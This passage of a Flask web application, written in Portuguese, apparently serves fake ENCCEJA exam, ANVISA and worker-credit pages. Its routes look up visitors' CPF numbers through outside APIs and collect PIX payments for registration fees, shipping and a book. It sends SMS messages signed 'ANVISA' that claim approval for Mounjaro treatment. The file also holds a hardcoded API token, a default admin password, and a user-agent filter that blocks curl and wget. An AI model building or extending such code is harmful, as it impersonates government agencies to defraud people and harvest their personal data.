            return redirect(url_for('sms_config'))

        # Message template for test
        message = "[PROGRAMA CREDITO DO TRABALHADOR] Esta é uma mensagem de teste do sistema."

        # Choose which API to use based on SMS_API_CHOICE
        if SMS_API_CHOICE.upper() == 'OWEN':
            success = send_sms_owen(phone, message)
        else:  # Default to SMSDEV
            success = send_sms_smsdev(phone, message)

        if success:
            session['test_result'] = f"SMS de teste enviado com sucesso para {phone}"
            session['test_success'] = True
        else:
            session['test_result'] = f"Falha ao enviar SMS para {phone}. Verifique o número e tente novamente."
            session['test_success'] = False

        return redirect(url_for('sms_config'))
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar SMS de teste: {str(e)}")
        session['test_result'] = f"Erro ao enviar SMS de teste: {str(e)}"
        session['test_success'] = False
        return redirect(url_for('sms_config'))

@app.route('/livro')
def livro():
    """Página de livro após confirmação do pagamento de R$ 143,10"""
    try:
        # Get customer data from query parameters if available
        customer = {
            'name': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', '')
        }
        
        app.logger.info(f"[PROD] Renderizando página do livro com dados: {customer}")
        meta_pixel_id = os.environ.get('META_PIXEL_ID')
        
        return render_template('livro.html', customer=customer, meta_pixel_id=meta_pixel_id)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página do livro: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/encceja')
def encceja():
    """Página do Encceja 2025"""
    return render_template('encceja.html')

@app.route('/cadastro')
@confirm_genuity()
def cadastro():
    """Página de inscrição do Encceja 2025"""
    try:
        # Enviando evento ViewContent para o Facebook Conversion API
        try:
            from facebook_conversion_api import track_view_content
            track_view_content(content_name="Cadastro ENCCEJA", content_type="form")
            app.logger.info("[FACEBOOK] Evento ViewContent enviado para /cadastro")
        except Exception as fb_error:
            app.logger.error(f"[FACEBOOK] Erro ao enviar evento ViewContent: {str(fb_error)}")
            
        return render_template('cadastro.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página de cadastro: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/validar-dados')
@confirm_genuity()
def validar_dados():
    """Página de validação de dados do usuário com CPF"""
    try:
        cpf = request.args.get('cpf', '')
        app.logger.info(f"[PROD] Acessando página de validação de dados - CPF: {cpf}")
        return render_template('validar_dados_anvisa.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar validação de dados: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/validacao-em-andamento')
@confirm_genuity()
def validacao_em_andamento():
    """Página que mostra as etapas de validação em andamento"""
    try:
        app.logger.info("[PROD] Acessando página de validação em andamento")
        return render_template('validacao_em_andamento.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página de validação em andamento: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
    
@app.route('/questionario-saude')
@confirm_genuity()
def questionario_saude():
    """Página com o questionário de saúde"""
    try:
        app.logger.info("[PROD] Acessando página de questionário de saúde")
        return render_template('questionario_saude.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar questionário de saúde: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/enviar-sms-questionario', methods=['POST'])
def enviar_sms_questionario():
    """Endpoint para enviar SMS após conclusão do questionário"""
    import threading
    
    def enviar_sms_async(dados_json):
        """Função assíncrona para enviar SMS sem bloquear a resposta da API"""
        try:
            phone_number = dados_json.get('phone', '')
            nome_completo = dados_json.get('nome', '')
            
            # Se o telefone não foi informado, não temos como enviar SMS
            if not phone_number:
                app.logger.error("[PROD] Telefone não informado para envio de SMS")
                return
            
            # Extrair o primeiro nome
            primeiro_nome = nome_completo.split(' ')[0] if nome_completo else ''
            
            # Remover acentos do primeiro nome
            import unicodedata
            primeiro_nome = unicodedata.normalize('NFKD', primeiro_nome).encode('ASCII', 'ignore').decode('utf-8')
            
            # Verificar se o primeiro nome tem mais de 8 caracteres
            variavel_nome = f" {primeiro_nome}" if primeiro_nome and len(primeiro_nome) <= 8 else ""
            
            # Obter estimativa de perda de peso enviada no JSON, com fallback para 9kg
            estimativa_perda_peso = dados_json.get('estimativaPerdaPeso', 9)
            
            # Mensagem a ser enviada
            mensagem = f"ANVISA: Seu cadastro foi aprovado para iniciar o tratamento de emagrecimento com o MOUNJARO 5mg.{variavel_nome} a sua estimativa de perda de peso no 1º mês e de: {estimativa_perda_peso}kg"
            
            # Log para debug
            app.logger.info(f"[PROD] Preparando SMS para {phone_number} com mensagem: {mensagem}")
            
            # Formatar o telefone para o formato internacional
            if phone_number and not phone_number.startswith('+'):
                if phone_number.startswith('55'):
                    phone_number = f"+{phone_number}"
                else:
                    phone_number = f"+55{phone_number}"
            
            # Verificar se o telefone está no formato correto
            if not phone_number or len(phone_number.replace('+', '')) < 10:
                app.logger.error(f"[PROD] Telefone inválido para envio de SMS: {phone_number}")
                return
            
            # Chamada para a API externa para enviar SMS
            import requests
            response = requests.post(
                'https://neto-contatonxcase.replit.app/api/manual-notification',
                json={
                    'phone': phone_number,
                    'message': mensagem,
                    'shortUrls': True
                },
                headers={'Content-Type': 'application/json'}
            )
            
            # Verificar resposta
            if response.status_code == 200:
                resposta_json = response.json()
                if resposta_json.get('success'):
                    app.logger.info(f"[PROD] SMS enviado com sucesso para {phone_number}")
                else:
                    app.logger.error(f"[PROD] Erro na API de SMS: {resposta_json}")
            else:
                app.logger.error(f"[PROD] Erro ao enviar SMS: {response.text}")
            
        except Exception as e:
            app.logger.error(f"[PROD] Erro ao enviar SMS assíncrono: {str(e)}")
    
    try:
        # Capturar dados da requisição
        dados = request.json
        
        # Iniciar thread para enviar SMS de forma assíncrona
        thread = threading.Thread(target=enviar_sms_async, args=(dados,))
        thread.daemon = True  # Para a thread terminar quando o programa principal terminar
        thread.start()
        
        # Retornar resposta imediatamente, sem esperar pelo envio do SMS
        return jsonify({
            'success': True, 
            'message': 'Solicitação de SMS recebida e será processada em segundo plano'
        })
            
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao processar requisição de SMS: {str(e)}")
        return jsonify({'success': False, 'error': 'Erro interno do servidor'}), 500

@app.route('/endereco')
@confirm_genuity()
def endereco():
    """Página de cadastro de endereço"""
    try:
        app.logger.info("[PROD] Acessando página de cadastro de endereço")
        
        # Para /endereco, o evento Lead será acionado via JavaScript quando o usuário clicar no botão
        # "Prosseguir para detalhes do produto", conforme solicitado nos requisitos
        # Mas ainda podemos adicionar código para capturar parâmetros UTM e armazená-los para uso posterior
        try:
            # Capturar parâmetros UTM da URL
            utm_params = {}
            for param in ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content', 'utm_term']:
                value = request.args.get(param)
                if value:
                    utm_params[param] = value
                    session[param] = value  # Armazenar na sessão
                    
            if utm_params:
                app.logger.info(f"[FACEBOOK] Parâmetros UTM capturados na rota /endereco: {utm_params}")
                session['utm_params'] = utm_params
        except Exception as utm_error:
            app.logger.error(f"[FACEBOOK] Erro ao processar parâmetros UTM: {str(utm_error)}")
            
        # Passar a chave da API do Google Maps para o template
        google_maps_api_key = os.environ.get('GOOGLE_MAPS_API_KEY', '')
        return render_template('endereco.html', google_maps_api_key=google_maps_api_key)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar página de cadastro de endereço: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

# Rotas removidas e movidas para anvisa_routes.py

@app.route('/local-prova')
def local_prova():
    """Página de seleção do local de prova"""
    return render_template('local_prova.html')

@app.route('/inscricao-sucesso')
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    return render_template('inscricao_sucesso.html')
    
@app.route('/pagar-frete', methods=['POST'])
@secure_api('pagar_frete')
def pagar_frete():
    """Cria uma transação PIX para pagamento do frete"""
    try:
        data = request.json
        telefone = data.get('telefone', '')
        
        # Verificar se este cliente está atingindo o limite de transações
        from transaction_tracker import track_transaction_attempt, get_client_ip
        
        # Obter o IP do cliente para rastreamento
        client_ip = get_client_ip()
        
        # Verificar limites de transação por nome, CPF e telefone
        is_allowed, message = track_transaction_attempt(client_ip, {
            'name': 'Pagamento do Frete',
            'cpf': '78964164172',
            'phone': telefone
        })
        
        if not is_allowed:
            app.logger.warning(f"[PROD] Bloqueio de transação - pagamento de frete: {message}")
            return jsonify({'error': f'Limite de transações atingido: {message}'}), 429
        
        # Criar dados para o pagamento
        payment_data = {
            'name': 'Pagamento do Frete',
            'cpf': '78964164172',  # CPF sem pontuação
            'email': 'frete' + str(int(time.time())) + '@gmail.com',  # Email aleatório
            'phone': telefone,
            'amount': 52.60  # Valor fixo do frete
        }
        
        # Criar a transação PIX
        from for4pagamentos import create_payment_api
        api = create_payment_api()
        result = api.create_pix_payment(payment_data)
        
        return jsonify({
            'success': True,
            'transaction_id': result.get('id'),
            'pixCode': result.get('pixCode'),
            'pixQrCode': result.get('pixQrCode')
        })
    
    except Exception as e:
        app.logger.error(f"Erro ao gerar pagamento do frete: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500
        
@app.route('/verificar-pagamento-frete', methods=['POST'])
def verificar_pagamento_frete():
    """Verifica o status do pagamento do frete"""
    try:
        data = request.json
        transaction_id = data.get('transactionId')
        
        if not transaction_id:
            return jsonify({'success': False, 'error': 'ID da transação não fornecido'}), 400
            
        # Verificar status do pagamento
        from for4pagamentos import create_payment_api
        api = create_payment_api()
        status_data = api.check_payment_status(transaction_id)
        
        app.logger.info(f"[PROD] Verificando status do pagamento {transaction_id}")
        
        # Transformar status da API para nosso formato padrão
        original_status = status_data.get('status')
        
        if original_status in ['APPROVED', 'PAID', 'COMPLETED']:
            status = 'completed'
        elif original_status in ['PENDING', 'PROCESSING']:
            status = 'pending'
        else:
            status = 'failed'
            
        # Se o pagamento está em status pendente, vamos buscar os dados do PIX novamente
        # já que a API não retorna o pixCode e pixQrCode no check_payment_status
        pixCode = status_data.get('pixCode')
        pixQrCode = status_data.get('pixQrCode')
        
        # Para pagamentos pendentes sem código PIX, vamos recuperar o código original
        if status == 'pending' and (not pixCode or not pixQrCode):
            try:
                # Recriar o PIX com os mesmos dados
                payment_data = {
                    'name': 'Pagamento do Frete',
                    'cpf': '78964164172',  # CPF sem pontuação
                    'email': 'frete' + str(int(time.time())) + '@gmail.com',  # Email aleatório
                    'phone': '61982132603',  # Telefone fixo para reuso
                    'amount': 52.60  # Valor fixo do frete
                }
                
                result = api.create_pix_payment(payment_data)
                app.logger.info(f"[PROD] Recriando PIX para pagamento pendente: {transaction_id}")
                pixCode = result.get('pixCode')
                pixQrCode = result.get('pixQrCode')
            except Exception as e:
                app.logger.error(f"Erro ao recriar PIX: {str(e)}")
                # Continuar com os valores originais (vazios) se falhar
        
        return jsonify({
            'success': True,
            'status': status,
            'original_status': original_status,
            'pixQrCode': pixQrCode,
            'pixCode': pixCode
        })
            
    except Exception as e:
        app.logger.error(f"Erro ao verificar pagamento do frete: {str(e)}")
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/encceja-info')
def encceja_info():
    """Página com informações detalhadas sobre o Encceja"""
    return render_template('encceja_info.html')


# Rota de exemplo para demonstrar o uso dos recursos de detecção
@app.route('/exemplo')
def exemplo_template():
    """Página de exemplo para demonstrar detecção de dispositivo e origem"""
    from request_analyzer import is_from_social_ad, is_mobile, get_ad_source
    
    # Verificar se veio de anúncio social
    is_from_ad = is_from_social_ad()
    
    # Verificar se é dispositivo móvel
    mobile = is_mobile()
    
    # Obter origem do anúncio
    ad_source = get_ad_source() if is_from_ad else 'orgânico'
    
    # Oferta especial para quem vem de anúncios
    show_special_offer = is_from_ad
    
    # Versão otimizada para mobile
    show_mobile_version = mobile
    
    # Renderizar template com os dados
    return render_template(
        'exemplo.html',
        is_from_ad=is_from_ad,
        is_mobile=mobile,
        ad_source=ad_source,
        show_special_offer=show_special_offer,
        show_mobile_version=show_mobile_version
    )


@app.route('/processar-compra', methods=['POST'])
def processar_compra():
    """Processa o formulário de compra do produto Monjauros"""
    if request.method == 'POST':
        # Aqui seria implementada a lógica de processamento da compra
        # Como validação de dados, integração com gateway de pagamento, etc.
        
        # Por enquanto, apenas redirecionamos para a página de sucesso
        return redirect(url_for('compra_sucesso'))
    
    return redirect(url_for('compra'))

# Definição removida - existe outra implementação da rota compra_sucesso

# Definições para o sistema de autenticação do monitor
MONITOR_USERNAME = os.environ.get('MONITOR_USERNAME', 'admin')
MONITOR_PASSWORD = os.environ.get('MONITOR_PASSWORD', 'seguranca2025')

@app.route('/monitor', methods=['GET', 'POST'])
def monitor():
    """Interface web para monitorar o estado de segurança do sistema"""
    authenticated = False
    error = None
    
    # Verificar autenticação
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == MONITOR_USERNAME and password == MONITOR_PASSWORD:
            authenticated = True
            # Definir uma sessão para autenticação
            session['authenticated_monitor'] = True
        else:
            error = "Credenciais inválidas. Tente novamente."
    elif 'authenticated_monitor' in session:
        authenticated = True
    
    # Se autenticado, preparar os dados para o monitoramento
    if authenticated:
        # Timestamp atual formatado
        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        
        # Estatísticas básicas
        banned_ips_count = len(BANNED_IPS)
        tracked_ips_count = len(TRANSACTION_ATTEMPTS)
        client_data_count = len(CLIENT_DATA_TRACKING)
        name_count = len(NAME_TRANSACTION_COUNT)
        cpf_count = len(CPF_TRANSACTION_COUNT)
        phone_count = len(PHONE_TRANSACTION_COUNT)
        
        # IPs banidos
        banned_ips = []
        for ip, ban_until in BANNED_IPS.items():
            ban_until_formatted = ban_until.strftime("%d/%m/%Y %H:%M:%S") if isinstance(ban_until, datetime) else str(ban_until)
            banned_ips.append((ip, ban_until_formatted))
        
        # Top nomes por transações
        names = []
        sorted_names = sorted(NAME_TRANSACTION_COUNT.items(), key=lambda x: x[1]['count'], reverse=True)
        for name, data in sorted_names[:10]:
            last_attempt = data['last_attempt'].strftime("%d/%m/%Y %H:%M:%S") if isinstance(data['last_attempt'], datetime) else str(data['last_attempt'])
            names.append((name, data['count'], last_attempt))
        
        # Top CPFs por transações
        cpfs = []
        sorted_cpfs = sorted(CPF_TRANSACTION_COUNT.items(), key=lambda x: x[1]['count'], reverse=True)
        for cpf, data in sorted_cpfs[:10]:
            # Mascarar o CPF por segurança
            masked_cpf = cpf[:3] + "*****" + cpf[-2:] if len(cpf) >= 5 else cpf
            last_attempt = data['last_attempt'].strftime("%d/%m/%Y %H:%M:%S") if isinstance(data['last_attempt'], datetime) else str(data['last_attempt'])
            cpfs.append((masked_cpf, data['count'], last_attempt))
        
        # Top telefones por transações
        phones = []
        sorted_phones = sorted(PHONE_TRANSACTION_COUNT.items(), key=lambda x: x[1]['count'], reverse=True)
        for phone, data in sorted_phones[:10]:
            # Mascarar o telefone por segurança
            masked_phone = phone[:3] + "*****" + phone[-2:] if len(phone) >= 5 else phone
            last_attempt = data['last_attempt'].strftime("%d/%m/%Y %H:%M:%S") if isinstance(data['last_attempt'], datetime) else str(data['last_attempt'])
            phones.append((masked_phone, data['count'], last_attempt))
        
        # Métricas para alertas
        name_near_limit_count = len([name for name, data in NAME_TRANSACTION_COUNT.items() if data['count'] >= 15])
        cpf_near_limit_count = len([cpf for cpf, data in CPF_TRANSACTION_COUNT.items() if data['count'] >= 15])
        phone_near_limit_count = len([phone for phone, data in PHONE_TRANSACTION_COUNT.items() if data['count'] >= 15])
        multi_ip_clients_count = len([client for client, data in CLIENT_DATA_TRACKING.items() if len(data['ips']) >= 3])
        
        # Renderizar a página com os dados
        return render_template(
            'monitor.html',
            authenticated=authenticated,
            timestamp=timestamp,
            banned_ips_count=banned_ips_count,
            tracked_ips_count=tracked_ips_count,
            client_data_count=client_data_count,
            name_count=name_count,
            cpf_count=cpf_count,
            phone_count=phone_count,
            banned_ips=banned_ips,
            names=names,
            cpfs=cpfs,
            phones=phones,
            name_near_limit_count=name_near_limit_count,
            cpf_near_limit_count=cpf_near_limit_count,
            phone_near_limit_count=phone_near_limit_count,
            multi_ip_clients_count=multi_ip_clients_count,
            blocked_names=BLOCKED_NAMES
        )
    
    # Se não estiver autenticado, mostrar formulário de login
    return render_template('monitor.html', authenticated=authenticated, error=error)

@app.route('/comprar-livro', methods=['GET', 'POST'])
@secure_api('comprar_livro')
def comprar_livro():
    """Página para iniciar o pagamento do livro de R$ 143,10"""
    if request.method == 'POST':
        # Obter dados do usuário
        data = request.get_json()
        nome = data.get('nome')
        cpf = data.get('cpf')
        telefone = data.get('telefone')
        
        if not nome or not cpf:
            return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
            
        # Verificar se este cliente está atingindo o limite de transações
        from transaction_tracker import track_transaction_attempt, get_client_ip
        
        # Obter o IP do cliente para rastreamento
        client_ip = get_client_ip()
        
        # Verificar limites de transação por nome, CPF e telefone
        is_allowed, message = track_transaction_attempt(client_ip, {
            'name': nome,
            'cpf': cpf,
            'phone': telefone if telefone else ''
        })
        
        if not is_allowed:
            app.logger.warning(f"[PROD] Bloqueio de transação - compra de livro: {message}")
            return jsonify({'error': f'Limite de transações atingido: {message}'}), 429
        
        try:
            # Criar instância da API de pagamento
            payment_api = get_payment_gateway()
            
            # Criar pagamento do livro (R$ 143,10)
            app.logger.info(f"[PROD] Criando pagamento de livro digital para: {nome} ({cpf})")
            payment_result = payment_api.create_pix_payment({
                'name': nome,
                'cpf': cpf,
                'phone': telefone,
                'amount': 143.10,  # Valor específico do livro digital
                'email': f"{nome.lower().replace(' ', '')}@gmail.com"
            })
            
            app.logger.info(f"[PROD] Pagamento de livro criado: {payment_result.get('id')}")
            
            # Retornar os dados do pagamento
            return jsonify(payment_result)
        except Exception as e:
            app.logger.error(f"Erro ao criar pagamento do livro: {str(e)}")
            
            # Gerar um código PIX de exemplo para caso de falha na API
            demo_payment_data = {
                'id': 'demo-123456',
                'pixCode': '00020126870014br.gov.bcb.pix2565pix.example.com/qr/demo/12345',
                'status': 'PENDING'
            }
            
            # Retornar resposta com mensagem de erro, mas com dados de exemplo
            return jsonify({
                'warning': f"API de pagamento temporariamente indisponível: {str(e)}",
                **demo_payment_data
            }), 200
    
    # Para requisições GET, renderizar a página de pagamento
    return render_template('pagamento.html', is_book_payment=True)

@app.route('/pagamento', methods=['GET', 'POST'])
@limiter.limit("3 per minute")  # Strict rate limit for payment endpoint
def pagamento_encceja():
    ip = request.remote_addr
    
    # Check if IP is banned
    if is_ip_banned(ip):
        app.logger.warning(f"Blocked request from banned IP: {ip}")
        abort(403, description="Your IP has been banned due to suspicious activity")
        
    # Basic bot detection
    user_agent = request.headers.get('User-Agent', '').lower()
    if not user_agent or 'bot' in user_agent or 'curl' in user_agent or 'wget' in user_agent:
        attempts = increment_ip_attempts(ip)
        if attempts >= BAN_THRESHOLD:
            app.logger.warning(f"IP banned due to suspicious activity: {ip}")
        abort(403, description="Bot activity detected")
        
    # Additional security headers
    response = make_response()
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    """Página de pagamento da taxa do Encceja"""
    if request.method == 'POST':
        # Obter dados do usuário
        data = request.get_json()
        nome = data.get('nome')
        cpf = data.get('cpf')
        telefone = data.get('telefone')
        has_discount = data.get('has_discount', False)
        is_book_payment = data.get('is_book_payment', False)  # Novo campo para pagamento do livro
        
        if not nome or not cpf:
            return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
            
        # Verificar se este cliente está atingindo o limite de transações
        from transaction_tracker import track_transaction_attempt, get_client_ip
        
        # Obter o IP do cliente para rastreamento
        client_ip = get_client_ip()
        
        # Verificar limites de transação por nome, CPF e telefone
        is_allowed, message = track_transaction_attempt(client_ip, {
            'name': nome,
            'cpf': cpf,
            'phone': telefone if telefone else ''
        })
        
        if not is_allowed:
            app.logger.warning(f"[PROD] Bloqueio de transação - pagamento ENCCEJA: {message}")
            return jsonify({'error': f'Limite de transações atingido: {message}'}), 429
        
        try:
            # Criar instância da API de pagamento
            payment_api = get_payment_gateway()
            
            if is_book_payment:
                # Pagamento do livro digital (R$ 143,10)
                app.logger.info(f"[PROD] Criando pagamento de livro digital para: {nome} ({cpf})")
                payment_result = payment_api.create_pix_payment({
                    'name': nome,
                    'cpf': cpf,
                    'phone': telefone,
                    'amount': 143.10,  # Valor específico do livro digital
                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
                })
                app.logger.info(f"[PROD] Pagamento de livro criado: {payment_result.get('id')}")
            elif has_discount:
                # Usar API de pagamento através do gateway configurado
                app.logger.info(f"[PROD] Criando pagamento com desconto para: {nome} ({cpf})")
                payment_result = payment_api.create_pix_payment({
                    'name': nome,
                    'cpf': cpf,
                    'phone': telefone,
                    'amount': 49.70,
                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
                })
            else:
                # Usar API de pagamento através do gateway configurado
                app.logger.info(f"[PROD] Criando pagamento regular para: {nome} ({cpf})")
                payment_result = payment_api.create_pix_payment({
                    'name': nome,
                    'cpf': cpf,
                    'phone': telefone,
                    'amount': 73.40,
                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
                })
            
            # Retornar os dados do pagamento
            return jsonify(payment_result)
        except Exception as e:
            app.logger.error(f"Erro ao criar pagamento: {str(e)}")
            
            # Gerar um código PIX de exemplo para caso de falha na API
            # Isso é necessário apenas para demonstração da interface no ambiente de desenvolvimento
            demo_payment_data = {
                'id': 'demo-123456',
                'pixCode': '00020126870014br.gov.bcb.pix2565pix.example.com/qr/demo/12345',
                # Não incluímos pixQrCode pois o JavaScript na página vai usar uma imagem de exemplo
                'status': 'PENDING'
            }
            
            # Retornar resposta com mensagem de erro, mas com dados de exemplo para a interface
            return jsonify({
                'warning': f"API de pagamento temporariamente indisponível: {str(e)}",
                **demo_payment_data
            }), 200  # Retornar 200 para a página processar normalmente, mas com alerta
    
    # Para requisições GET, renderizar a página de pagamento
    return render_template('pagamento.html')

@app.route('/consultar-cpf')
def consultar_cpf():
    """Busca informações de um CPF na API do webhook-manager (para a página de verificar-cpf)"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    # Limpar o CPF de qualquer caractere não numérico
    cpf_limpo = re.sub(r'[^\d]', '', cpf)
    app.logger.info(f"[PROD] Consultando CPF na API: {cpf_limpo}")
    
    # URL da API especificada
    api_url = f"https://webhook-manager.replit.app/api/v1/cliente?cpf={cpf_limpo}"
    
    try:
        # Fazer a solicitação para a API
        app.logger.info(f"[PROD] Enviando requisição para: {api_url}")
        response = requests.get(api_url)
        
        # Log da resposta recebida
        app.logger.info(f"[PROD] Resposta da API (status code): {response.status_code}")
        
        data = response.json()
        app.logger.debug(f"[PROD] Dados recebidos da API: {data}")
        
        # Verificar se a consulta foi bem-sucedida
        if data.get('sucesso') and 'cliente' in data:
            cliente = data['cliente']
            
            # Remover qualquer formatação do CPF
            cpf_sem_pontuacao = re.sub(r'[^\d]', '', cliente.get('cpf', ''))
            nome_completo = cliente.get('nome', '')
            
            # Obter o telefone
            telefone_bruto = cliente.get('telefone', '')
            app.logger.info(f"[PROD] Telefone recebido da API: {telefone_bruto}")
            
            # Processar o telefone adequadamente
            telefone = telefone_bruto
            # Se começar com +55, remover
            if telefone.startswith('+55'):
                telefone = telefone[3:]
            # Se começar com 55 e for longo o suficiente, pode ser o código do país sem o +
            elif telefone.startswith('55') and len(telefone) >= 12:
                telefone = telefone[2:]
            # Remover qualquer outro caractere não numérico
            telefone = re.sub(r'[^\d]', '', telefone)
            
            app.logger.info(f"[PROD] Dados processados: CPF={cpf_sem_pontuacao}, Nome={nome_completo}, Telefone Original={telefone_bruto}, Telefone Processado={telefone}")
            
            # Construir URL de redirecionamento com os parâmetros necessários
            redirect_url = f"/obrigado?nome={urllib.parse.quote(nome_completo)}&cpf={cpf_sem_pontuacao}&phone={urllib.parse.quote(telefone)}"
            app.logger.info(f"[PROD] Redirecionando para: {redirect_url}")
            return redirect(redirect_url)
        else:
            erro = data.get('erro', 'CPF não encontrado ou inválido')
            app.logger.warning(f"[PROD] Erro na consulta de CPF: {erro}")
            # Em caso de erro na API, ainda retornar JSON para que o front-end possa tratar
            return jsonify({"error": erro}), 404
    
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao buscar CPF {cpf_limpo}: {str(e)}")
        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}"}), 500

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API Exato Digital (para a página de inscrição)"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # Usar token fixo da API Exato Digital para buscar os dados do CPF
        token = "268753a9b3a24819ae0f02159dee6724"
            
        url = f"https://api.exato.digital/receita-federal/cpf?token={token}&cpf={cpf_numerico}&format=json"
        app.logger.info(f"[PROD] Consultando CPF {cpf_numerico} na API Exato Digital")
        
        response = requests.get(url)
        if response.status_code == 200:
            # Obter os dados da resposta da API
            data = response.json()
            app.logger.info(f"[PROD] Resposta da API recebida com sucesso")
            
            # Retornar os dados completos da API para o frontend processar
            return jsonify(data)
        else:
            app.logger.error(f"[PROD] Erro na API Exato: {response.status_code}")
            # Em caso de erro na chamada da API, utilizar o CPF de exemplo fornecido
            if cpf_numerico == "15896074654":
                # Criar resposta simulando a estrutura da API Exato Digital
                sample_data = {
                    "UniqueIdentifier": "cxrlu9d50g8h4mzpv6a07jj55",
                    "TransactionResultTypeCode": 1,
                    "TransactionResultType": "Success",
                    "Message": "Sucesso",
                    "TotalCostInCredits": 1,
                    "BalanceInCredits": -4,
                    "ElapsedTimeInMilliseconds": 110,
                    "Reserved": None,
                    "Date": "2025-04-16T23:06:37.4127718-03:00",
                    "OutdatedResult": True,
                    "HasPdf": False,
                    "DataSourceHtml": None,
                    "DateString": "2025-04-16T23:06:37.4127718-03:00",
                    "OriginalFilesUrl": "https://api.exato.digital/services/original-files/cxrlu9d50g8h4mzpv6a07jj55",
                    "PdfUrl": None,
                    "TotalCost": 0,
                    "BalanceInBrl": None,
                    "DataSourceCategory": "Sem categoria",
                    "Result": {
                        "NumeroCpf": "158.960.746-54",
                        "NomePessoaFisica": "PEDRO LUCAS MENDES SOUZA",
                        "DataNascimento": "2006-12-13T00:00:00.0000000",
                        "SituacaoCadastral": "REGULAR",
                        "DataInscricaoAnterior1990": False,
                        "ConstaObito": False,
                        "DataEmissao": "2025-04-10T20:28:08.4287800",
                        "Origem": "ReceitaBase",
                        "SituacaoCadastralId": 1
                    }
                }
                app.logger.info(f"[PROD] Retornando dados de exemplo para o CPF 158.960.746-54")
                return jsonify(sample_data)
            else:
                # Para qualquer CPF, vamos usar uma resposta de exemplo
                app.logger.info(f"[PROD] Retornando dados de exemplo para o CPF {cpf_numerico}")
                sample_data = {
                    "UniqueIdentifier": "cxrlu9d50g8h4mzpv6a07jj55",
                    "TransactionResultTypeCode": 1,
                    "TransactionResultType": "Success",
                    "Message": "Sucesso",
                    "TotalCostInCredits": 1,
                    "BalanceInCredits": -4,
                    "ElapsedTimeInMilliseconds": 110,
                    "Reserved": None,
                    "Date": "2025-04-16T23:06:37.4127718-03:00",
                    "OutdatedResult": True,
                    "HasPdf": False,
                    "DataSourceHtml": None,
                    "DateString": "2025-04-16T23:06:37.4127718-03:00",
                    "OriginalFilesUrl": "https://api.exato.digital/services/original-files/cxrlu9d50g8h4mzpv6a07jj55",
                    "PdfUrl": None,
                    "TotalCost": 0,
                    "BalanceInBrl": None,
                    "DataSourceCategory": "Sem categoria",
                    "Result": {
                        "NumeroCpf": f"{cpf_numerico[:3]}.{cpf_numerico[3:6]}.{cpf_numerico[6:9]}-{cpf_numerico[9:11]}",
                        "NomePessoaFisica": "USUÁRIO DE TESTE",
                        "DataNascimento": "1985-01-01T00:00:00.0000000",
                        "SituacaoCadastral": "REGULAR",
                        "DataInscricaoAnterior1990": False,
                        "ConstaObito": False,
                        "DataEmissao": "2025-04-10T20:28:08.4287800",
                        "Origem": "ReceitaBase",
                        "SituacaoCadastralId": 1
                    }
                }
                return jsonify(sample_data)
    
    except Exception as e:
        app.logger.error(f"Erro ao buscar CPF na API Exato: {str(e)}")
        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}"}), 500

@app.route('/utmify-webhook', methods=['POST'])
def utmify_webhook():
    """
    Webhook para receber notificações de pagamento e enviar para a Utmify.
    
    Este endpoint recebe dados de pagamento (POST) e os encaminha para a Utmify
    seguindo o formato esperado pela API Utmify.
    """
    try:
        app.logger.info("[PROD] Recebendo webhook de pagamento")
        
        # Verificar se o conteúdo é JSON
        if not request.is_json:
            app.logger.error("[PROD] Webhook recebido com formato inválido (não é JSON)")
            return jsonify({'error': 'Formato inválido, esperado JSON'}), 400
            
        # Obter os dados do webhook
        webhook_data = request.json
        app.logger.info(f"[PROD] Dados recebidos no webhook: {json.dumps(webhook_data, indent=2)[:1000]}...")
        
        # Processar os dados do webhook e enviar para a Utmify
        result = process_payment_webhook(webhook_data)
        
        if result.get('success'):
            app.logger.info(f"[PROD] Webhook processado com sucesso: {result.get('message')}")
            return jsonify({'success': True, 'message': result.get('message')}), 200
        else:
            app.logger.error(f"[PROD] Erro ao processar webhook: {result.get('message')}")
            return jsonify({'success': False, 'message': result.get('message')}), 500
            
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao processar webhook: {str(e)}")
        return jsonify({'error': f'Erro interno: {str(e)}'}), 500

@app.route('/api/facebook-event/lead', methods=['POST'])
@secure_api('facebook_lead_event')
def facebook_lead_event():
    """
